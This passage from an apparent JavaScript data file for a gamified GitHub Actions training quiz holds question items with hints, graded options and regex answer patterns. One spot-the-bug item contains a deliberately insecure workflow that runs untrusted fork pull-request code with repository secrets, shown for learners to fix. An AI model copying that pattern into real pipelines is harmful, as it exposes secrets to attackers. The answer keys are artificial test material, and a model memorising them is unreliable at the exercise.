          hintFull: 'Best: base it on the pipeline\'s actual automated safety net — a team with strong test coverage, canary analysis, and automated rollback can reasonably go fully automated; a team without that maturity benefits from a manual approval gate as a real safety check, not just process theater.',
          options: [
            { id: 'a', label: 'Always require manual approval, regardless of pipeline maturity', tier: 'defensible', why: 'Safe by default, but for a team with genuinely strong automated safeguards (tests, canary, automated rollback), an unconditional manual gate adds real friction without a corresponding safety benefit.' },
            { id: 'b', label: 'Base it on the pipeline\'s actual automated safety net maturity', tier: 'best', why: 'Matches the amount of human oversight to how much the automation can actually be trusted — neither blanket rule accounts for how mature (or immature) a specific pipeline\'s automated safeguards really are.' },
            { id: 'c', label: 'Never require manual approval, to maximize deploy speed', tier: 'wrong', why: 'Assumes the automated pipeline is always trustworthy enough to fully replace human judgment — a real risk for any team without genuinely strong automated safeguards already in place.' }
          ],
          justificationPatterns: [/automated\s*safety\s*net|pipeline\s*maturity|depends\s*on|test\s*coverage/i]
        },
        {
          mode: 'triage_call',
          prompt: 'The Phantom\'s voice echoes: <strong>"Choosing between semantic-release automation and manually deciding version numbers for each release. Pick your move, then justify it in one line."</strong>',
          damageIfCorrect: 22, damageIfOptimal: 38, timeAllotted: 40,
          hintNudge: 'Manual versioning relies on someone remembering the semver rules correctly every single release. Automated tooling derives the correct version number directly from the actual commit history/conventions.',
          hintPartial: 'Automated semantic-release tooling derives the version number directly and consistently from commit history (using a convention like Conventional Commits), removing the human error risk of manually applying semver rules every release.',
          hintFull: 'Best (for a team already using a commit convention): semantic-release automation — consistently correct version bumps derived directly from commit history, versus manual versioning\'s real risk of a human misjudging major/minor/patch under release-day time pressure.',
          options: [
            { id: 'a', label: 'Always decide version numbers manually, based on team discussion', tier: 'defensible', why: 'Works, but relies on someone correctly applying semver rules every single release under real time pressure — a real, recurring source of human error that automation removes entirely.' },
            { id: 'b', label: 'Adopt semantic-release automation, driven by a commit message convention', tier: 'best', why: 'Consistently and correctly derives the version bump from actual commit history, removing the human-error risk of manually judging major/minor/patch each release — but only works well once the team has adopted a consistent commit convention.' },
            { id: 'c', label: 'Never version releases explicitly at all — just use the latest commit hash', tier: 'wrong', why: 'Loses semantic versioning\'s actual value entirely — consumers of the package/API can no longer reason about compatibility or breaking changes from the version identifier itself.' }
          ],
          justificationPatterns: [/semantic.?release|automat(ed|ion)|commit\s*convention|conventional\s*commits/i]
        },
        {
          mode: 'triage_call',
          prompt: 'A slab grinds within the stage: <strong>"Deciding whether every environment (dev, staging, production) needs its own protection rules, or just production. Pick your move, then justify it in one line."</strong>',
          damageIfCorrect: 22, damageIfOptimal: 38, timeAllotted: 40,
          hintNudge: 'The COST of a bad deploy is wildly different across environments — dev is meant for fast iteration, production affects real users. Protection should scale with actual consequence, not be uniform.',
          hintPartial: 'Scale protection to actual consequence — dev/staging benefit from staying fast and low-friction for iteration, while production (where real users are affected) genuinely warrants required reviewers and stricter gates.',
          hintFull: 'Best: scale protection rules to the real consequence of a bad deploy in each environment — dev should stay fast/low-friction to support rapid iteration, while production (where mistakes actually reach real users) warrants required reviewers, wait timers, or other real protection.',
          options: [
            { id: 'a', label: 'Apply the exact same strict protection rules to every environment, including dev', tier: 'wrong', why: 'Adds real, unnecessary friction to dev/staging, which exist specifically to support fast iteration — a bad dev deploy has essentially no real-world consequence compared to a bad production one.' },
            { id: 'b', label: 'Scale protection rules to each environment\'s actual consequence — light for dev/staging, strict for production', tier: 'best', why: 'Matches the level of caution to the real stakes — dev stays fast for iteration, production (where real users are affected) gets the genuine protection that consequence actually warrants.' },
            { id: 'c', label: 'Apply no protection rules anywhere, and rely entirely on code review before merge', tier: 'wrong', why: 'Code review catches code problems, not deploy-time issues (wrong environment, bad timing, insufficient monitoring) — environment protection rules address a genuinely different, real risk.' }
          ],
          justificationPatterns: [/scale.*consequence|production.*(strict|protect)|dev.*fast|actual\s*(risk|stakes)/i]
        },
        {
          mode: 'triage_call',
          prompt: 'A final tentacle rises: <strong>"A monorepo\'s CI runs the ENTIRE test suite on every single change, even a one-line doc update. Deciding how to fix this. Pick your move, then justify it in one line."</strong>',
          damageIfCorrect: 22, damageIfOptimal: 38, timeAllotted: 40,
          hintNudge: 'A doc-only change genuinely doesn\'t need the app\'s test suite run at all — the right fix is making CI aware of WHICH parts of the repo actually changed, not running everything unconditionally every time.',
          hintPartial: 'Add path-based filtering so CI only runs the relevant jobs for whichever part(s) of the monorepo actually changed — a doc-only PR shouldn\'t trigger the full app test suite at all.',
          hintFull: 'Best: use path filters (on: push/pull_request: paths:) so each job only runs when files relevant to it actually changed — this directly fixes the "everything runs on every change" problem instead of just tolerating it or removing testing altogether.',
          options: [
            { id: 'a', label: 'Just accept the slow pipeline — thoroughness is worth the wait', tier: 'defensible', why: 'Safe, but tolerates a real, fixable inefficiency — a doc-only change genuinely gains nothing from running the full test suite, and the wait adds up across every contributor, every PR.' },
            { id: 'b', label: 'Add path-based filtering so jobs only run for relevant changed files', tier: 'best', why: 'Directly targets the actual problem — CI running everything regardless of what changed — by making it aware of which parts of the monorepo a given change actually touches.' },
            { id: 'c', label: 'Remove testing from CI and rely on developers testing locally before pushing', tier: 'wrong', why: 'Throws away CI\'s core value (a consistent, automated safety net) to solve what\'s really just a targeting/efficiency problem — path filtering solves the real issue without giving up automated testing.' }
          ],
          justificationPatterns: [/path\s*filter|relevant\s*(changed\s*)?files|targeted|only\s*run\s*for/i]
        },
        {
          mode: 'read_the_room',
          prompt: 'A translucent shape flickers with error. <strong>Two production deploys triggered close together end up interleaved, with the wrong version ending up live. Diagnose it, then fix it.</strong>',
          damageIfCorrect: 24, damageIfOptimal: 40, timeAllotted: 40,
          hintNudge: 'Nothing is preventing two deploy runs to the SAME environment from executing simultaneously — a concurrency control is what serializes (or cancels) overlapping runs.',
          hintPartial: 'There\'s no concurrency group on the deploy workflow, so two triggers close together run fully in parallel with no ordering guarantee — whichever happens to finish last "wins," regardless of which was triggered first.',
          hintFull: 'Diagnosis: no concurrency control means overlapping deploys can interleave with no defined order. Fix: add a concurrency group keyed by environment, ensuring only one deploy to that environment runs at a time.',
          outputBlock: [
            '$ gh run list --workflow=deploy.yml',
            '(two runs both "in progress" at the same time, targeting the same environment)'
          ],
          acceptableDiagnosesPatterns: [/no\s*concurrency/i, /overlapping\s*deploys?/i, /race\s*condition/i],
          followUpFix: {
            prompt: 'Fix it by adding a concurrency group for this environment:',
            acceptablePatterns: [],
            optimalPatterns: [/concurrency:/i]
          }
        },
        {
          mode: 'read_the_room',
          prompt: 'The Phantom flickers between two worlds. <strong>A GitHub release was created, but the built binaries/assets that should be attached to it are missing. Diagnose it, then fix it.</strong>',
          damageIfCorrect: 24, damageIfOptimal: 40, timeAllotted: 40,
          hintNudge: 'Creating a release and uploading assets to it are two SEPARATE actions — check whether the workflow actually performs the upload step at all.',
          hintPartial: 'The workflow creates the release but never actually runs an upload-assets step afterward — the release exists, but nothing was ever attached to it.',
          hintFull: 'Diagnosis: the release-creation step ran, but no follow-up step uploads the build artifacts to it. Fix: add an upload step (e.g. gh release upload, or the upload-release-asset action) referencing the built files.',
          outputBlock: [
            '$ gh release view v2.0.0',
            'Assets: (none)',
            '',
            '(workflow log shows "Release created" but no upload step afterward)'
          ],
          acceptableDiagnosesPatterns: [/no\s*upload\s*step/i, /never\s*(uploads?|attaches?)/i, /missing\s*upload/i],
          followUpFix: {
            prompt: 'Fix it by adding a step that uploads the built assets to the release:',
            acceptablePatterns: [],
            optimalPatterns: [/gh\s+release\s+upload|upload-release-asset/i]
          }
        },
        {
          mode: 'read_the_room',
          prompt: 'A hollow silence answers a request. <strong>A canary deploy is stuck at a small percentage of traffic and never proceeds further, though no errors are being reported. Diagnose it, then fix it.</strong>',
          damageIfCorrect: 24, damageIfOptimal: 40, timeAllotted: 40,
          hintNudge: 'A canary\'s progression usually depends on reading real metrics to confirm health before advancing — check whether that metrics check itself is actually working, versus genuinely finding a problem.',
          hintPartial: 'The canary\'s automated health check is querying a metrics endpoint that\'s misconfigured (wrong dashboard/query), so it never confirms "healthy" — the canary logic itself is fine, but its health signal is broken, not actually detecting a real problem.',
          hintFull: 'Diagnosis: the canary\'s health-check step is querying a broken/misconfigured metrics source, so it can never confirm health to progress. Fix: correct the metrics query/endpoint the health check relies on, then re-verify the canary can actually progress on a real healthy signal.',
          outputBlock: [
            '$ (canary controller log)',
            'Waiting for health check to pass... (stuck for 45 minutes)',
            '',
            '$ curl <health-check-metrics-endpoint>',
            '404 Not Found'
          ],
          acceptableDiagnosesPatterns: [/health\s*check.*(misconfigur|broken|wrong)/i, /metrics\s*(endpoint|query).*(wrong|broken)/i],
          followUpFix: {
            prompt: 'Fix the health check\'s metrics query, then confirm the canary can actually progress:',
            acceptablePatterns: [],
            optimalPatterns: [/metrics\s*(endpoint|query)/i]
          }
        },
        {
          mode: 'read_the_room',
          prompt: 'A shifting form completes half a ritual. <strong>A blue-green deploy finishes "successfully", but the new version never actually receives any real traffic. Diagnose it, then fix it.</strong>',
          damageIfCorrect: 24, damageIfOptimal: 40, timeAllotted: 40,
          hintNudge: 'Blue-green requires an explicit traffic-switch step at the end — deploying the new (green) environment successfully doesn\'t automatically redirect anything to it.',
          hintPartial: 'The pipeline deploys the new "green" environment successfully, but never actually runs the traffic-switch step that points the load balancer/router at it — old "blue" is still serving 100% of traffic.',
          hintFull: 'Diagnosis: the deploy succeeded, but the cutover step that switches traffic to the new environment was never run. Fix: add (or fix) the explicit traffic-switch step at the end of the pipeline.',
          outputBlock: [
            '$ (deploy log)',
            'Green environment deployed successfully.',
            '(pipeline ends here — no traffic-switch step ever runs)'
          ],
          acceptableDiagnosesPatterns: [/no\s*(traffic\s*)?(switch|cutover)/i, /never\s*(switch|redirect)/i],
          followUpFix: {
            prompt: 'Fix it by adding the missing traffic cutover step:',
            acceptablePatterns: [],
            optimalPatterns: [/switch\s*traffic|cutover|update.*load\s*balancer/i]
          }
        },
        {
          mode: 'read_the_room',
          prompt: 'A single haunting spreads to every stage at once. <strong>A small change to a shared reusable workflow instantly broke every pipeline that calls it. Diagnose it, then fix it.</strong>',
          damageIfCorrect: 24, damageIfOptimal: 40, timeAllotted: 40,
          hintNudge: 'Check exactly how every caller references the reusable workflow — referencing it by a mutable branch name means every caller automatically gets ANY change the instant it\'s pushed, with zero warning.',
          hintPartial: 'Every caller references the reusable workflow by branch name (e.g. @main), so a change pushed there takes effect for every single caller instantly and simultaneously — there was never any version isolation between them.',
          hintFull: 'Diagnosis: callers reference the reusable workflow by a mutable branch, so any change to it immediately affects everyone. Fix: pin each caller to a specific tag or commit SHA of the reusable workflow, so changes only take effect when a caller deliberately updates its pinned reference.',
          outputBlock: [
            '$ grep -r "deploy-reusable.yml" .github/workflows/',
            'uses: org/repo/.github/workflows/deploy-reusable.yml@main',
            '(appears identically, unpinned, in 12 different calling workflows)'
          ],
          acceptableDiagnosesPatterns: [/unpinned|mutable\s*branch/i, /referenced?\s*by\s*branch/i, /no\s*version\s*isolation/i],
          followUpFix: {
            prompt: 'Fix it by pinning callers to a specific version instead of a mutable branch:',
            acceptablePatterns: [],
            optimalPatterns: [/@v\d|@[0-9a-f]{7,40}/i]
          }
        },
        {
          mode: 'read_the_room',
          prompt: 'A misdirected key opens the wrong vault. <strong>A deploy job is somehow using a staging secret while deploying to production. Diagnose it, then fix it.</strong>',
          damageIfCorrect: 24, damageIfOptimal: 40, timeAllotted: 40,
          hintNudge: 'Environment-scoped secrets are tied to a job\'s "environment:" field — check whether that field is actually set to the right environment name for this job.',
          hintPartial: 'The deploy job is missing (or has the wrong) "environment:" field — without correctly declaring environment: production, it doesn\'t get production\'s environment-scoped secret at all, and something else (a repo-level or wrong-environment secret) is being picked up instead.',
          hintFull: 'Diagnosis: the job\'s environment field is missing or incorrect, so it isn\'t actually pulling production\'s environment-scoped secret. Fix: set environment: production explicitly on the deploy job.',
          outputBlock: [
            '$ (workflow file, production deploy job)',
            'deploy-prod:',
            '  runs-on: ubuntu-latest',
            '  # no environment: field set at all',
            '  steps:',
            '    - run: deploy --key=${{ secrets.API_KEY }}'
          ],
          acceptableDiagnosesPatterns: [/missing\s*environment/i, /environment.*field.*(missing|wrong)/i],
          followUpFix: {
            prompt: 'Fix it by explicitly setting the correct environment on the job:',
            acceptablePatterns: [],
            optimalPatterns: [/environment:\s*production/i]
          }
        },
        {
          mode: 'build_the_pipeline',
          prompt: 'A drifting form assembles a checklist. <strong>Sequence the correct order for setting up an environment-gated production deployment.</strong>',
          steps: [
            'Create a "production" environment in repository settings',
            'Add required reviewers as a protection rule on it',
            'Reference environment: production in the deploy job',
            'Store production secrets scoped to that environment',
            'Confirm a deploy actually pauses for approval before proceeding'
          ],
          damageIfCorrect: 26, damageIfOptimal: 42,
          damageToHeroIfWrong: 24
        },
        {
          mode: 'build_the_pipeline',
          prompt: 'The Phantom flickers into a familiar shape. <strong>Sequence the correct order for a canary deployment.</strong>',
          steps: [
            'Deploy the new version alongside the old, receiving a small % of traffic',
            'Monitor real metrics/error rates for the canary specifically',
            'Gradually increase traffic if metrics stay healthy',
            'Roll back automatically if metrics degrade at any point',
            'Fully promote once 100% traffic is healthy'
          ],
          damageIfCorrect: 26, damageIfOptimal: 42,
          damageToHeroIfWrong: 24
        },
        {
          mode: 'build_the_pipeline',
          prompt: 'A pale shape steadies itself. <strong>Sequence the correct order for a semantic-release-driven release process.</strong>',
          steps: [
            'Merge commits following a consistent convention (e.g. Conventional Commits)',
            'Semantic-release analyzes commit history since the last release',
            'It determines the correct next version (major/minor/patch)',
            'It generates a changelog and creates the release automatically',
            'It publishes the new version'
          ],
          damageIfCorrect: 26, damageIfOptimal: 42,
          damageToHeroIfWrong: 24
        }
      ]
    },
    {
      name: 'Level 4 — Real Incidents',
      hp: 170,
      questions: [
        {
          mode: 'terminal',
          prompt: 'The Phantom scans a graveyard of runs: <strong>"List only the workflow runs that failed."</strong>',
          damageIfCorrect: 18, damageIfOptimal: 28, timeAllotted: 32,
          hintNudge: 'gh run list, with a status filter flag.',
          hintPartial: 'gh run list --______=failure',
          hintFull: 'gh run list --status=failure',
          acceptablePatterns: [],
          optimalPatterns: [/^gh\s+run\s+list\s+--status=failure$/i],
          baseCmds: ['gh']
        },
        {
          mode: 'terminal',
          prompt: 'A pale echo runs the ritual privately: <strong>"Run just the job named \'test\' from a workflow locally, without pushing anything."</strong>',
          damageIfCorrect: 18, damageIfOptimal: 28, timeAllotted: 32,
          hintNudge: 'The local-runner tool, with a job-targeting flag.',
          hintPartial: 'act -_ test',
          hintFull: 'act -j test',
          acceptablePatterns: [/^act$/i],
          optimalPatterns: [/^act\s+-j\s+test$/i],
          baseCmds: ['act']
        },
        {
          mode: 'terminal',
          prompt: 'The Phantom severs a compromised thread: <strong>"Remove the repository secret <code>DEPLOY_KEY</code> immediately, after discovering it was exposed."</strong>',
          damageIfCorrect: 18, damageIfOptimal: 28, timeAllotted: 32,
          hintNudge: 'The same secret-delete command as before — urgency doesn\'t change the syntax.',
          hintPartial: 'gh secret ______ DEPLOY_KEY',
          hintFull: 'gh secret delete DEPLOY_KEY',
          acceptablePatterns: [],
          optimalPatterns: [/^gh\s+secret\s+delete\s+DEPLOY_KEY$/i],
          baseCmds: ['gh']
        },
        {
          mode: 'terminal',
          prompt: 'It clears space in a cluttered den: <strong>"On a self-hosted runner, remove all unused Docker images and stopped containers to free disk space."</strong>',
          damageIfCorrect: 18, damageIfOptimal: 28, timeAllotted: 32,
          hintNudge: 'The same Docker system-cleanup command used anywhere else Docker runs.',
          hintPartial: 'docker system _____',
          hintFull: 'docker system prune -af',
          acceptablePatterns: [/^docker\s+system\s+prune$/i],
          optimalPatterns: [/^docker\s+system\s+prune\s+-af$/i],
          baseCmds: ['docker']
        },
        {
          mode: 'terminal',
          prompt: 'The Phantom checks a workflow\'s true reach: <strong>"View the permissions granted to GITHUB_TOKEN for the most recent workflow run."</strong>',
          damageIfCorrect: 20, damageIfOptimal: 32, timeAllotted: 32,
          hintNudge: 'gh api pointed at that specific run\'s own detail endpoint reveals its effective token permissions.',
          hintPartial: 'gh api repos/{owner}/{repo}/actions/runs/{run_id}',
          hintFull: 'gh api repos/{owner}/{repo}/actions/runs/{run_id}',
          acceptablePatterns: [],
          optimalPatterns: [/^gh\s+api\s+repos\/\{owner\}\/\{repo\}\/actions\/runs\/\{run_id\}$/i],
          baseCmds: ['gh']
        },
        {
          mode: 'spot_the_bug',
          prompt: 'The Phantom shows a flickering scroll: <strong>"This workflow runs untrusted fork PR code WITH access to repository secrets — a real security hole. Find and fix the bug."</strong>',
          damageIfCorrect: 22, damageIfOptimal: 36, timeAllotted: 32,
          hintNudge: 'One specific trigger type runs with the BASE repo\'s permissions and secrets, even for a fork\'s PR — using it to check out and run the fork\'s own code directly is a well-known, serious security mistake.',
          hintPartial: 'Line 1 uses pull_request_target (which grants secrets/write access) but then checks out and runs the PR\'s OWN code directly — that combination lets untrusted fork code run with full access to secrets.',
          hintFull: 'Fix: either switch to the plain pull_request trigger (no secrets access, safe for untrusted code) if secrets aren\'t needed, or if pull_request_target is truly required, never check out and execute the fork\'s own code with it — only use it for actions that don\'t run untrusted code.',
          codeBlock: [
            'on: pull_request_target',
            'jobs:',
            '  test:',
            '    steps:',
            '      - uses: actions/checkout@v4',
            '        with:',
            '          ref: ${{ github.event.pull_request.head.sha }}',
            '      - run: npm test'
          ],
          buggyLineId: 0,
          correctFixPatterns: [/pull_request(?!_target)/i]
        },
        {
          mode: 'spot_the_bug',
          prompt: 'A flickering page turns itself: <strong>"A third-party action is pinned to a mutable tag that could change underneath the pipeline at any time. Find and fix the bug."</strong>',
          damageIfCorrect: 22, damageIfOptimal: 36, timeAllotted: 32,
          hintNudge: 'A tag like @v2 can be MOVED by its publisher to point at a different, possibly malicious commit at any time — a full commit SHA can never be silently changed.',
          hintPartial: 'Line 1 pins to @v2, a mutable tag the action\'s publisher can repoint at any time — pin to the exact commit SHA instead, which can never silently change underneath you.',
          hintFull: 'Line 1 should read: - uses: some-org/some-action@a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2',
          codeBlock: [
            '- uses: some-org/some-action@v2'
          ],
          buggyLineId: 0,
          correctFixPatterns: [/uses:\s*some-org\/some-action@[0-9a-f]{40}/i]
        },
        {
          mode: 'spot_the_bug',
          prompt: 'The Phantom\'s form distorts: <strong>"A hung step in this job can run forever with no automatic cutoff, and there\'s no timeout anywhere. Find and fix the bug."</strong>',
          damageIfCorrect: 22, damageIfOptimal: 36, timeAllotted: 32,
          hintNudge: 'Without an explicit time limit on the job, a step that\'s genuinely hung (not just slow) can tie up a runner indefinitely.',
          hintPartial: 'There\'s no timeout-minutes set on this job at all — add a reasonable one so a hung step fails automatically instead of running forever.',
          hintFull: 'Add to the job: timeout-minutes: 15',
          codeBlock: [
            'build:',
            '  runs-on: self-hosted'
          ],
          buggyLineId: 0,
          correctFixPatterns: [/timeout-minutes:\s*\d+/i]
        },
        {
          mode: 'spot_the_bug',
          prompt: 'A ghostly line refuses to align: <strong>"A self-hosted runner is configured to run every job as root, with no real need to. Find and fix the bug."</strong>',
          damageIfCorrect: 22, damageIfOptimal: 36, timeAllotted: 32,
          hintNudge: 'Running CI jobs as root grants far more access than most build/test steps actually need — a compromised dependency or malicious test could do real damage to the whole runner machine.',
          hintPartial: 'The runner service is configured/launched as root with no genuine need — reconfigure it to run as a dedicated, non-root, least-privilege user.',
          hintFull: 'Reconfigure the runner service to run as a dedicated non-root user instead of root.',
          codeBlock: [
            '(runner service config): User=root'
          ],
          buggyLineId: 0,
          correctFixPatterns: [/non-root|dedicated\s*user|least\s*privilege/i]
        },
        {
          mode: 'triage_call',
          prompt: 'The Phantom tilts its head: <strong>"A specific test fails intermittently (maybe 1 in 20 runs) and is now blocking every PR. Pick your move, then justify it in one line."</strong>',
          damageIfCorrect: 24, damageIfOptimal: 40, timeAllotted: 32,
          hintNudge: 'One option makes the immediate pain go away instantly, but risks the underlying real bug (timing issue, race condition, shared state) being forgotten forever. One keeps the safety net while giving space to actually investigate.',
          hintPartial: 'Quarantine the flaky test (skip it, or move it out of the required/blocking set) immediately to unblock the team, but track it as a real bug to actually fix — don\'t just silently delete or permanently ignore it.',
          hintFull: 'Best: quarantine it immediately (mark it non-blocking, with a tracked follow-up issue) to unblock the team right away, while treating the flakiness itself as a real bug to actually investigate and fix — not something to just silently delete and forget.',
          options: [
            { id: 'a', label: 'Delete the test entirely so it stops blocking PRs', tier: 'wrong', why: 'Removes whatever real coverage the test provided along with the flakiness — the underlying bug it might have been (correctly or incorrectly) catching is now completely unmonitored.' },
            { id: 'b', label: 'Quarantine it (mark non-blocking) immediately, with a tracked issue to actually fix the flakiness', tier: 'best', why: 'Unblocks the team right away without losing track of the real problem — the test isn\'t deleted, just temporarily out of the blocking path while its actual root cause gets investigated.' },
            { id: 'c', label: 'Just keep re-running the pipeline until it happens to pass', tier: 'wrong', why: 'Wastes real CI time and, worse, normalizes ignoring a real signal — a flaky test is very often masking a genuine race condition or timing bug that this approach never actually investigates.' }
          ],
          justificationPatterns: [/quarantine|non.?blocking|tracked\s*issue|unblock.*fix/i]
        },
        {
          mode: 'triage_call',
          prompt: 'A translucent hand weighs two paths: <strong>"Deciding whether to pin third-party GitHub Actions to a version tag or a full commit SHA. Pick your move, then justify it in one line."</strong>',
          damageIfCorrect: 24, damageIfOptimal: 40, timeAllotted: 32,
          hintNudge: 'A tag can be moved by its publisher (or an attacker who compromises their account) to point at a completely different, possibly malicious commit — a commit SHA is immutable and can never be silently swapped.',
          hintPartial: 'Pin to a full commit SHA — unlike a tag, it can never be silently repointed at different (possibly malicious) code by the publisher or an attacker who compromises their account.',
          hintFull: 'Best: pin to a full commit SHA, especially for third-party (non-org-owned) actions — this is a real, well-documented supply-chain attack vector, and a SHA is cryptographically immutable in a way a tag simply isn\'t.',
          options: [
            { id: 'a', label: 'A version tag (e.g. @v2), for readability', tier: 'wrong', why: 'A tag can be moved by its publisher — or an attacker who compromises their account — to point at entirely different, possibly malicious code, with the pipeline picking it up automatically and silently.' },
            { id: 'b', label: 'A full commit SHA', tier: 'best', why: 'Immutable by design — nobody can silently swap what code actually runs under that reference, closing off a real, well-documented supply-chain attack vector for a small readability cost.' },
            { id: 'c', label: 'The "latest" branch, to always get the newest version automatically', tier: 'wrong', why: 'The most exposed option of all three — automatically picks up ANY change, malicious or not, the instant it\'s pushed, with zero review or warning.' }
          ],
          justificationPatterns: [/commit\s*sha|immutable|supply.?chain/i]
        },
        {
          mode: 'triage_call',
          prompt: 'The Phantom\'s voice echoes: <strong>"A CI secret was just discovered to have been exposed (echoed into a build log). Pick your move, then justify it in one line."</strong>',
          damageIfCorrect: 24, damageIfOptimal: 40, timeAllotted: 32,
          hintNudge: 'The log itself isn\'t the real problem — anyone who could view that log has already seen the actual secret value, which is what needs addressing directly.',
          hintPartial: 'Rotate/revoke the exposed secret immediately, treating it as fully compromised — deleting the log entry (if even possible) does nothing about the credential itself having already been visible to anyone who saw it.',
          hintFull: 'Best: rotate/revoke the credential immediately (it must be treated as compromised the moment it was visible in a log anyone could read), THEN fix the actual leak (masking, or removing the echo of a sensitive value) and clean up/restrict the exposed log if possible.',
          options: [
            { id: 'a', label: 'Just delete the workflow run\'s log to remove the exposure', tier: 'wrong', why: 'Doesn\'t un-expose the credential to anyone who already saw the log before deletion — the secret itself is still fully valid and now known to whoever viewed it.' },
            { id: 'b', label: 'Rotate/revoke the credential immediately, then fix the actual leak', tier: 'best', why: 'Neutralizes the real risk (a now-known, still-valid credential) first — cleaning up the log is a secondary step that doesn\'t address the credential itself having already been seen.' },
            { id: 'c', label: 'Add a note in the log warning people not to use the exposed secret', tier: 'wrong', why: 'Does nothing to actually invalidate a credential that is, right now, still fully functional and known — a note doesn\'t stop it from being misused.' }
          ],
          justificationPatterns: [/rotate|revoke|compromised|immediately/i]
        },
        {
          mode: 'triage_call',
          prompt: 'A slab grinds within the stage: <strong>"A self-hosted runner\'s disk is completely full, failing every job. Pick your move, then justify it in one line."</strong>',
          damageIfCorrect: 24, damageIfOptimal: 40, timeAllotted: 32,
          hintNudge: 'Just freeing space right now fixes the immediate outage, but doesn\'t answer why it filled up in the first place — that same cause will refill it again soon without a real fix.',
          hintPartial: 'Clear space immediately to restore service (docker/build cache cleanup), but also investigate WHY it filled up — an unmanaged accumulation (old images, build artifacts never cleaned) will just refill it again without addressing the real cause.',
          hintFull: 'Best: clear space immediately to restore CI (e.g. docker system prune, clearing stale caches) to stop the immediate outage, then investigate and fix the actual accumulation cause (e.g. add automatic periodic cleanup) so it doesn\'t recur.',
          options: [
            { id: 'a', label: 'Just add a bigger disk and move on', tier: 'defensible', why: 'Buys real time, but doesn\'t address whatever\'s accumulating unmanaged (old images, stale caches, build artifacts) — without a real fix, the bigger disk eventually fills too.' },
            { id: 'b', label: 'Clear space immediately to restore service, then investigate and fix the actual accumulation cause', tier: 'best', why: 'Restores CI right away (stops the immediate outage) while also addressing why it happened, so the same failure doesn\'t just recur on the same timeline.' },
            { id: 'c', label: 'Ignore it until someone has time to look at it properly', tier: 'wrong', why: 'Leaves every job failing indefinitely for an active production CI system — this needs an immediate mitigation regardless of when the deeper investigation happens.' }
          ],
          justificationPatterns: [/clear\s*space.*investigate|immediate.*(and|then)\s*(root\s*cause|fix)|accumulation/i]
        },
        {
          mode: 'triage_call',
          prompt: 'A final tentacle rises: <strong>"An automated deploy from CI just introduced a serious production bug. Pick your move, then justify it in one line."</strong>',
          damageIfCorrect: 24, damageIfOptimal: 40, timeAllotted: 32,
          hintNudge: 'The pipeline that just deployed the bad version is also the fastest, most reliable path back to the last known-good one — that\'s usually faster and safer than debugging live in production.',
          hintPartial: 'Trigger a rollback through the same pipeline back to the last known-good deployed version — this is typically the fastest way to stop user impact, with root-cause investigation happening afterward once things are stable.',
          hintFull: 'Best: roll back immediately via the pipeline to the last known-good version to stop user impact fast, THEN investigate the root cause once stable — the standard stabilize-first incident shape, same as any other production incident.',
          options: [
            { id: 'a', label: 'Debug and forward-fix live in production to find the exact issue first', tier: 'wrong', why: 'Leaves the serious bug affecting real users the entire time you investigate, when a fast, reliable rollback to the last known-good version is sitting right there and available.' },
            { id: 'b', label: 'Roll back immediately to the last known-good version, investigate afterward', tier: 'best', why: 'Stops user impact fast using the most reliable, already-proven path (the previous working deploy) — investigation happens once things are stable, not while users are actively affected.' },
            { id: 'c', label: 'Wait and monitor to see if the issue resolves on its own', tier: 'wrong', why: 'Passive in a situation with a clear, fast, low-risk fix (rollback) sitting right there and unused — there\'s no reason to just wait when the cause is this recent and this obvious.' }
          ],
          justificationPatterns: [/rollback|roll\s*back|last\s*known.?good|stabilize/i]
        },
        {
          mode: 'triage_call',
          prompt: 'A shifting form blocks a locked door: <strong>"During a genuine, active production emergency, deploying through the normal pipeline would take 20 extra minutes the team doesn\'t have. Pick your move, then justify it in one line."</strong>',
          damageIfCorrect: 24, damageIfOptimal: 40, timeAllotted: 32,
          hintNudge: 'Bypassing the pipeline entirely removes every safety check it provides, right when things are already unstable. A logged, deliberate exception process preserves some safety and a clear record, without the full normal delay.',
          hintPartial: 'Use a genuine emergency-deploy exception process (if one exists) — logged, requiring explicit sign-off — rather than quietly bypassing the pipeline entirely; if no such process exists yet, this incident is a strong argument for building one.',
          hintFull: 'Best: use a defined, logged emergency-deploy exception (explicit approval, clear audit trail) rather than silently going around the pipeline — this preserves accountability and a record of what happened, while still moving faster than the full normal process; if no such process exists, treat this incident as the reason to build one.',
          options: [
            { id: 'a', label: 'Quietly deploy directly, bypassing the pipeline entirely, to save time', tier: 'wrong', why: 'Removes every safety check the pipeline provides with zero record of what happened or why — especially risky during an active incident, when a mistake compounds an already-bad situation.' },
            { id: 'b', label: 'Use a defined, logged emergency-deploy exception process, or push to establish one', tier: 'best', why: 'Preserves accountability and a clear record while still moving faster than the full normal pipeline — the deliberate, sanctioned escape hatch instead of a silent, ad hoc bypass.' },
            { id: 'c', label: 'Insist on the full normal pipeline regardless of the emergency', tier: 'defensible', why: 'Maximizes safety, but a rigid one-size-fits-all process with zero emergency accommodation can itself become a real liability during a genuine, time-critical incident.' }
          ],
          justificationPatterns: [/logged|exception\s*process|audit\s*trail|sanctioned|accountability/i]
        },
        {
          mode: 'read_the_room',
          prompt: 'A translucent shape flickers with error. <strong>A build that always succeeds locally fails only occasionally in CI, with different tests failing each time. Diagnose it, then fix it.</strong>',
          damageIfCorrect: 26, damageIfOptimal: 44, timeAllotted: 32,
          hintNudge: 'Different tests failing each time (not the same one repeatedly) often points at tests interfering with each other via SHARED state, rather than any one test being individually broken.',
          hintPartial: 'Tests are sharing mutable state (a database, a global variable, a file) and running in a different order or in parallel in CI than locally — whichever test happens to run after the "polluting" one fails, which varies run to run.',
          hintFull: 'Diagnosis: tests share mutable state and are order/parallelism-dependent, causing different tests to fail depending on execution order. Fix: isolate each test\'s state (fresh database/fixtures per test, no shared globals) so execution order genuinely doesn\'t matter.',
          outputBlock: [
            '$ (CI log, run 1)',
            'FAIL: test_user_creation',
            '',
            '$ (CI log, run 2, same commit)',
            'FAIL: test_order_total',
            '(a different test fails each time, no consistent pattern)'
          ],
          acceptableDiagnosesPatterns: [/shared\s*(mutable\s*)?state/i, /test\s*(order|isolation)/i, /tests?\s*interfer/i],
          followUpFix: {
            prompt: 'Fix it by isolating each test\'s state:',
            acceptablePatterns: [],
            optimalPatterns: [/isolat|fresh\s*(database|fixture)/i]
          }
        },
        {
          mode: 'read_the_room',
          prompt: 'The Phantom flickers between two worlds. <strong>A popular third-party action used across many pipelines was just reported as compromised (a malicious update was pushed). Diagnose it, then fix it.</strong>',
          damageIfCorrect: 26, damageIfOptimal: 44, timeAllotted: 32,
